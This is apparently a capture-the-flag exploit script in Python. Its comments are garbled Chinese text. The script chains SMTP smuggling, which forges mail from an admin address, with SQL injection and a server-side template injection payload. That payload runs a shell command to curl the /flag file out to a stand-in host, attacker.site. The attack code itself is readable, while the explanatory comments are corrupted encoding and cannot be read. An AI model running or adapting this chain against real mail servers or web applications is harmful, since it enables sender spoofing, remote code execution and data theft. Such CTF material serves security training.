# ��Ҫ������SMTP Smuggling
# ע�⵽`/admin`��ʹ��`render_template_string()`ƴ����Ⱦ���ɹ���SSTI��
# ���еĿɿز���Դ�Ա��������������`admin@ezmail.org`���ʼ��е�Subject���urlָ��ı���ҳ�����ݡ�
# ��Ȼ`/report`���ܷ����ʼ������ǹ̶�������Ϊ`ignored@ezmail.org`��
# ��ϸ�Ķ�`/report`�µĴ��뷢�֣��ʼ�����Ҳ����ƴ��
# (Ϊ�˷��㹹������ʱ������ħ����`smtplib._quote_periods`)
# ���Թ���SMTP Smuggling��α�췢����Ϊ`admin@ezmail.org` ��
# ͬʱע�⵽`news`ҳ�����SQLI�����ǽ�SSTI Payload��UNION�ķ�ʽ����ҳ��������`/admin` ��ȡ���ɡ�

import requests

cookies = {
    'connect.sid': 'XXX',
}

headers = {
    'Host': 'ezmail.org:3000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}

content = """FAKE CONTENT\r\n""" + "\n.\n" + """\r\nmail FROM:<admin@ezmail.org>\r\nrcpt TO:<admin@ezmail.org>\r\ndata\r\nFrom: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: http://ezmail.org:3000/news?id=5 union select (select '{{request.application.__globals__.__builtins__.__import__("os").popen("curl http://attacker.site -d @/flag").read()}}') --\r\n\r\nSMUGGLING"""
data = f'url=123&content={content}'

response = requests.post('http://XXX.XXX.XXX.XXX:XXXX/report', cookies=cookies, headers=headers, data=data, verify=False)
requests.get('http://XXX.XXX.XXX.XXX:XXXX/bot')